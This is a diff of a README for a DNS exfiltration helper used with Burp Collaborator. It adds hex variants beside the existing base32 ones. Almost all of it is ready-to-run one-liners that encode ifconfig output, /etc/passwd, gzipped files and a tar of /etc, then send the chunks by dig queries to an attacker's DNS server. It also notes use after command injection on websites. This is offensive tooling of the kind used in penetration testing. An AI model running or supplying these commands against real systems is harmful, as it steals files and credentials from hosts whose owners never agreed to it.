@@ -10,7 +10,7 @@ Burp Collaborator allows prepending hostnames to the provided address. You may p
 java -jar /root/collaborator/burpsuite_pro.jar --collaborator-server | tee /root/collaborator/collaborator.log
 ```
 
-Assumes hostnames are encoded in base32 (`A-Z`, `2-7`) or lowercase hex (`0-9`, `a-f`), which which is safe for DNS queries (an can typically be sent via `bash` on Linux/Unix systems using `base32` or `xxd`). base32 is twice as efficient as hex. The `=` character (used to pad base32-encoded data to an 8 byte boundary) is not DNS safe, but can be trimmed using `tr -d =` on Linux/Unix systems. `dns-parse.py` appends any missing `=` characters. base64 does not work due to `/` and `+`.
+Assumes hostnames are encoded in base32 (`A-Z`, `2-7`) or lowercase hex (`0-9`, `a-f`), which which is safe for DNS queries (and can typically be sent via `bash` on Linux/Unix systems using `base32` or `xxd`). base32 is twice as efficient as hex. The `=` character (used to pad base32-encoded data to an 8 byte boundary) is not DNS safe, but can be trimmed using `tr -d =` on Linux/Unix systems. `dns-parse.py` appends any missing `=` characters. base64 does not work due to `/` and `+`.
 
 Thanks and credit to [Xavier Mertens](https://www.sans.org/profiles/xavier-mertens/) for his excellent [Internet Storm Center](https://isc.sans.edu/) post: [DNS Query Length... Because Size Does Matter](https://isc.sans.edu/diary/DNS+Query+Length...+Because+Size+Does+Matter/22326)
 
@@ -22,48 +22,74 @@ In the examples below: `<DNS Name>` is the random name provided by Burp Collabor
 
 ### Send STDOUT from a command:
 
+base32:
 ```
 ifconfig | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
+Hex:
+```
+ifconfig | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+```
+
 Decode the output:
 ```
-dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
+dns-parse.py <DNS Name> (query.log|collaborator.log)
 ```
 
 ### Exfiltrate a file:
 
+For `xxd` (hex): the `-p` flag is 'output  in  postscript  continuous  hexdump style', and `-c31` is count of 31 hex characters (62 bytes sent).
+
+base32:
 ```
 base32 -w 63 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
+Hex:
+```
+xxd -p -c31 < /etc/passwd | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+```
+
 Decode the file:
 ```
-dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
+dns-parse.py <DNS Name> (query.log|collaborator.log)
 ```
 
 ### Exfiltrate a compressed file:
 
+base32:
 ```
 gzip - < /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
+Hex:
+```
+gzip - < /etc/passwd | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+```
+
 Decode/unzip the file:
 ```
-dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d | zcat
+dns-parse.py <DNS Name> (query.log|collaborator.log) | zcat
 ```
 
 ### Exfiltrate a compressed tar archive of a directory:
 
 Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.
 
+base32:
 ```
 tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
+Hex:
+```
+tar czf - /etc | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+```
+
 Decode/save the tar archive:
 ```
-dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d > exfiltrated.tgz
+dns-parse.py <DNS Name> (query.log|collaborator.log) > exfiltrated.tgz
 ```
 
 ## Sample Logs
@@ -81,33 +107,4 @@ dns-parse.py 165cmzb1cu1m3wso0k1k3udr7id91y collaborator2.log | base32 -d
 [collaborator3.log](collaborator3.log) (gzipped /etc/passwd exfiltration):
 ```
 dns-parse.py l9vn8f4xr94q4f8j3t6ba8i5bwhm5b collaborator3.log | base32 -d | zcat
-```
-
-## Hex Support
-
-Hex support is coming, here's how to send hex-encoded data. Note that the `-p` flag is 'output  in  postscript  continuous  hexdump style', and `-c31` is count of 31 hex characters (62 bytes sent).
-
-Send STDOUT:
-```
-ifconfig | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
-```
-
-Send a file:
-```
-xxd -p -c31 < /etc/passwd | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
-```
-
-Send a compressed file:
-```
-gzip - < /etc/passwd | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
-```
-
-Send a compressed tar archive:
-```
-tar czf - /etc | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
-```
-
-Decode (using bash):
-```
-grep <DNS Name> collaborator.log| cut -d\[ -f3 | cut -d \. -f1 | tr -d '\n' | xxd -r -p
 ```
